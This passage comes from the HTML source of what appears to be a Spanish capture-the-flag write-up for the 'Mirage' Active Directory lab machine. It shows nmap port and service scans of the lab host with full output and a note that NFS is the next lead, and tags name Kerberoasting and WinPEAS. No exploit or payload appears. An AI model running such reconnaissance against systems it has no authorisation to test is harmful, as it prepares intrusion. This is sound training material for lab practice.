Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 4222/tcp open vrml-multi-use? | fingerprint-strings: | GenericLines: | INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2714,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} | -ERR &#39;Authorization Violation&#39; | GetRequest: | INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2715,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} | -ERR &#39;Authorization Violation&#39; | HTTPOptions: | INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2716,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} | -ERR &#39;Authorization Violation&#39; | NULL: | INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2713,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} |_ -ERR &#39;Authentication Timeout&#39; 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 51856/tcp open msrpc Microsoft Windows RPC 51863/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 51864/tcp open msrpc Microsoft Windows RPC 51879/tcp open msrpc Microsoft Windows RPC 51885/tcp open msrpc Microsoft Windows RPC 51913/tcp open msrpc Microsoft Windows RPC 51920/tcp open msrpc Microsoft Windows RPC 57944/tcp open msrpc Microsoft Windows RPC 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port53-TCP:V=7.97%I=7%D=7/21%Time=687E540E%P=x86_64-pc-linux-gnu%r(DNS- SF:SD-TCP,30,&#34;\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04 SF:_udp\x05local\0\0\x0c\0\x01&#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port4222-TCP:V=7.97%I=7%D=7/21%Time=687E53FB%P=x86_64-pc-linux-gnu%r(NU SF:LL,1D2,&#34;INFO\x20{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X SF:2UA7GZ23H6BFSXI26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II5 SF:7L6M4X2UA7GZ23H6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_c SF:ommit\&#34;:\&#34;a82cfda\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;por SF:t\&#34;:4222,\&#34;headers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:104857 SF:6,\&#34;jetstream\&#34;:true,\&#34;client_id\&#34;:2713,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254 SF:\&#34;,\&#34;xkey\&#34;:\&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\ SF:&#34;}\x20\r\n-ERR\x20&#39;Authentication\x20Timeout&#39;\r\n&#34;)%r(GenericLines,1D3, SF:&#34;INFO\x20{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ2 SF:3H6BFSXI26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2 SF:UA7GZ23H6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34; SF::\&#34;a82cfda\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:422 SF:2,\&#34;headers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jet SF:stream\&#34;:true,\&#34;client_id\&#34;:2714,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xk SF:ey\&#34;:\&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\ SF:r\n-ERR\x20&#39;Authorization\x20Violation&#39;\r\n&#34;)%r(GetRequest,1D3,&#34;INFO\x2 SF:0{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI SF:26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H SF:6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;:\&#34;a82cf SF:da\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:4222,\&#34;head SF:ers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jetstream\&#34; SF::true,\&#34;client_id\&#34;:2715,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xkey\&#34;:\&#34;X SF:C3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\r\n-ERR\ SF:x20&#39;Authorization\x20Violation&#39;\r\n&#34;)%r(HTTPOptions,1D3,&#34;INFO\x20{\&#34;ser SF:ver_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\&#34;,\ SF:&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI2 SF:6M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;:\&#34;a82cfda\&#34;,\&#34; SF:go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:4222,\&#34;headers\&#34;:t SF:rue,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jetstream\&#34;:true,\ SF:&#34;client_id\&#34;:2716,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xkey\&#34;:\&#34;XC3AIA5L SF:H4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\r\n-ERR\x20&#39;Aut SF:horization\x20Violation&#39;\r\n&#34;); Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-07-21T21:52:27 |_ start_date: N/A |_clock-skew: 6h59m47s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.54 seconds NFS Misconfig Vemos que el dominio tiene el puerto 111 (NFS) abierto y como no tenemos nada más por donde tirar, vamos ver que contiene, y en el caso de que podamos y haya algún tipo de archivo, descargarnos-lo.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="NFS">
+    <meta property="article:tag" content="DNS-Update">
+    <meta property="article:tag" content="Kerberoasting">
+    <meta property="article:tag" content="WinPEAS">
+    <meta property="og:image" content="https://borhuub.github.io/logo_machines/mirage.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/logo_machines/mirage.png">
+<meta name="twitter:title" content="Mirage">
+<meta name="twitter:description" content="
+Reconocimiento
+❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.78 -oG ports
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:49 &#43;0200
+Initiating SYN Stealth Scan at 16:49
+Scanning 10.10.11.78 [65535 ports]
+Discovered open port 111/tcp on 10.10.11.78
+Discovered open port 53/tcp on 10.10.11.78
+Discovered open port 445/tcp on 10.10.11.78
+Discovered open port 139/tcp on 10.10.11.78
+Discovered open port 135/tcp on 10.10.11.78
+Discovered open port 2049/tcp on 10.10.11.78
+Discovered open port 51863/tcp on 10.10.11.78
+Discovered open port 51920/tcp on 10.10.11.78
+Discovered open port 47001/tcp on 10.10.11.78
+Discovered open port 51885/tcp on 10.10.11.78
+Discovered open port 49667/tcp on 10.10.11.78
+Discovered open port 9389/tcp on 10.10.11.78
+Discovered open port 51856/tcp on 10.10.11.78
+Discovered open port 5985/tcp on 10.10.11.78
+Discovered open port 51864/tcp on 10.10.11.78
+Discovered open port 51879/tcp on 10.10.11.78
+Discovered open port 49669/tcp on 10.10.11.78
+Discovered open port 3269/tcp on 10.10.11.78
+Discovered open port 49664/tcp on 10.10.11.78
+Discovered open port 464/tcp on 10.10.11.78
+Discovered open port 389/tcp on 10.10.11.78
+Discovered open port 4222/tcp on 10.10.11.78
+Discovered open port 593/tcp on 10.10.11.78
+Discovered open port 49666/tcp on 10.10.11.78
+Discovered open port 51913/tcp on 10.10.11.78
+Discovered open port 51913/tcp on 10.10.11.78
+Discovered open port 4222/tcp on 10.10.11.78
+Discovered open port 389/tcp on 10.10.11.78
+Discovered open port 464/tcp on 10.10.11.78
+Discovered open port 49665/tcp on 10.10.11.78
+Discovered open port 636/tcp on 10.10.11.78
+Discovered open port 88/tcp on 10.10.11.78
+Discovered open port 57944/tcp on 10.10.11.78
+Discovered open port 3268/tcp on 10.10.11.78
+Completed SYN Stealth Scan at 16:49, 15.62s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.78
+Host is up, received user-set (0.035s latency).
+Scanned at 2025-07-21 16:49:25 CEST for 16s
+Not shown: 65439 closed tcp ports (reset), 66 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+111/tcp   open  rpcbind          syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+2049/tcp  open  nfs              syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+4222/tcp  open  vrml-multi-use   syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49669/tcp open  unknown          syn-ack ttl 127
+51856/tcp open  unknown          syn-ack ttl 127
+51863/tcp open  unknown          syn-ack ttl 127
+51864/tcp open  unknown          syn-ack ttl 127
+51879/tcp open  unknown          syn-ack ttl 127
+51885/tcp open  unknown          syn-ack ttl 127
+51913/tcp open  unknown          syn-ack ttl 127
+51920/tcp open  unknown          syn-ack ttl 127
+57944/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds
+           Raw packets sent: 86448 (3.804MB) | Rcvd: 66503 (2.660MB)
+❯ ports.py ports
+
+🔍 Puertos encontrados: 
+  ➜  53 
+  ➜  88 
+  ➜  111 
+  ➜  135 
+  ➜  139 
+  ➜  389 
+  ➜  445 
+  ➜  464 
+  ➜  593 
+  ➜  636 
+  ➜  2049 
+  ➜  3268 
+  ➜  3269 
+  ➜  4222 
+  ➜  5985 
+  ➜  9389 
+  ➜  47001 
+  ➜  49664 
+  ➜  49665 
+  ➜  49666 
+  ➜  49667 
+  ➜  49669 
+  ➜  51856 
+  ➜  51863 
+  ➜  51864 
+  ➜  51879 
+  ➜  51885 
+  ➜  51913 
+  ➜  51920 
+  ➜  57944 
+
+¡Puertos copiados en el portapapeles!
+❯ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49669,51856,51863,51864,51879,51885,51913,51920,57944 10.10.11.78 -oN targeted
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:51 &#43;0200
+Nmap scan report for 10.10.11.78
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE         VERSION
+53/tcp    open  domain          (generic dns response: SERVFAIL)
+| fingerprint-strings: 
+|   DNS-SD-TCP: 
+|     _services
+|     _dns-sd
+|     _udp
+|_    local
+88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-07-21 21:51:31Z)
+111/tcp   open  rpcbind         2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open  msrpc           Microsoft Windows RPC
+139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
+389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+2049/tcp  open  nlockmgr        1-4 (RPC #100021)
+3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+4222/tcp  open  vrml-multi-use?
+| fingerprint-strings: 
+|   GenericLines: 
+|     INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2714,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   GetRequest: 
+|     INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2715,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   HTTPOptions: 
+|     INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2716,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   NULL: 
+|     INFO {&#34;server_id&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;server_name&#34;:&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M&#34;,&#34;version&#34;:&#34;2.11.3&#34;,&#34;proto&#34;:1,&#34;git_commit&#34;:&#34;a82cfda&#34;,&#34;go&#34;:&#34;go1.24.2&#34;,&#34;host&#34;:&#34;0.0.0.0&#34;,&#34;port&#34;:4222,&#34;headers&#34;:true,&#34;auth_required&#34;:true,&#34;max_payload&#34;:1048576,&#34;jetstream&#34;:true,&#34;client_id&#34;:2713,&#34;client_ip&#34;:&#34;10.10.15.254&#34;,&#34;xkey&#34;:&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL&#34;} 
+|_    -ERR &#39;Authentication Timeout&#39;
+5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf          .NET Message Framing
+47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc           Microsoft Windows RPC
+49665/tcp open  msrpc           Microsoft Windows RPC
+49666/tcp open  msrpc           Microsoft Windows RPC
+49667/tcp open  msrpc           Microsoft Windows RPC
+49669/tcp open  msrpc           Microsoft Windows RPC
+51856/tcp open  msrpc           Microsoft Windows RPC
+51863/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+51864/tcp open  msrpc           Microsoft Windows RPC
+51879/tcp open  msrpc           Microsoft Windows RPC
+51885/tcp open  msrpc           Microsoft Windows RPC
+51913/tcp open  msrpc           Microsoft Windows RPC
+51920/tcp open  msrpc           Microsoft Windows RPC
+57944/tcp open  msrpc           Microsoft Windows RPC
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port53-TCP:V=7.97%I=7%D=7/21%Time=687E540E%P=x86_64-pc-linux-gnu%r(DNS-
+SF:SD-TCP,30,&#34;\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
+SF:_udp\x05local\0\0\x0c\0\x01&#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port4222-TCP:V=7.97%I=7%D=7/21%Time=687E53FB%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,1D2,&#34;INFO\x20{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X
+SF:2UA7GZ23H6BFSXI26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II5
+SF:7L6M4X2UA7GZ23H6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_c
+SF:ommit\&#34;:\&#34;a82cfda\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;por
+SF:t\&#34;:4222,\&#34;headers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:104857
+SF:6,\&#34;jetstream\&#34;:true,\&#34;client_id\&#34;:2713,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254
+SF:\&#34;,\&#34;xkey\&#34;:\&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\
+SF:&#34;}\x20\r\n-ERR\x20&#39;Authentication\x20Timeout&#39;\r\n&#34;)%r(GenericLines,1D3,
+SF:&#34;INFO\x20{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ2
+SF:3H6BFSXI26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2
+SF:UA7GZ23H6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;
+SF::\&#34;a82cfda\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:422
+SF:2,\&#34;headers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jet
+SF:stream\&#34;:true,\&#34;client_id\&#34;:2714,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xk
+SF:ey\&#34;:\&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\
+SF:r\n-ERR\x20&#39;Authorization\x20Violation&#39;\r\n&#34;)%r(GetRequest,1D3,&#34;INFO\x2
+SF:0{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI
+SF:26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H
+SF:6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;:\&#34;a82cf
+SF:da\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:4222,\&#34;head
+SF:ers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jetstream\&#34;
+SF::true,\&#34;client_id\&#34;:2715,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xkey\&#34;:\&#34;X
+SF:C3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\r\n-ERR\
